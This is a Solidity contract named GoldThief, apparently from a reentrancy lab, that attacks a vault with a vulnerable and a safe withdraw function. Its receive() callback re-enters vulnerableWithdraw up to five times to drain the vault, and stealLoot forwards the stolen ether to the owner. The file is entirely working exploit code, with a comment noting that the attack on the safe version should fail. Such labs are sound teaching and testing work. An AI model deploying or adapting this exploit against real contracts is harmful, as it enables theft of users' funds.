// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

interface IVault {
	function deposit() external payable;
	function vulnerableWithdraw() external;
	function safeWithdraw() external;
}

contract GoldThief {
	// Use interface as variable to reuse functions
	
    IVault public targetVault; //targetVault是我们要攻击的金库地址，用 IVault 接口包装。
	address public owner;
	uint public attackCount; //攻击次数
	bool public attackingSafe; //记录当前攻击的是哪一个版本的金库
	
    constructor(address _vaultAddress) {
		targetVault = IVault(_vaultAddress);
		owner = msg.sender;
	}

	function attackVulnerable() external payable {
		require(msg.sender == owner, "Only owner");
		require(msg.value >= 1 ether, "Not enough amount");
		
        attackingSafe = false;
		attackCount = 0;
		
        targetVault.deposit{value:msg.value}();
		targetVault.vulnerableWithdraw();
	}

	function attackSafe() external payable {
		require(msg.sender == owner, "Only owner");
		require(msg.value >= 1 ether, "Not enough amount");
		
        attackingSafe = true;
		attackCount = 0;
		
        targetVault.deposit{value:msg.value}();
		targetVault.safeWithdraw();
	}
	// Reentrance happens when receive eth
	receive() external payable {
		attackCount++;
		// Limit attack count to avoid gas loss
		if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
			targetVault.vulnerableWithdraw();
		}
		// Should not succeed
		if (attackingSafe) {
			targetVault.safeWithdraw();
		}
	}
	// Transfer balance to wallet
	function stealLoot() external {
		require(msg.sender == owner, "Only owner");
		(bool success, ) = payable(owner).call{value:address(this).balance}("");
		require(success, "Transfer failed");
	}
	function getBalance() external view returns (uint256) {
		return address(this).balance;
	}
}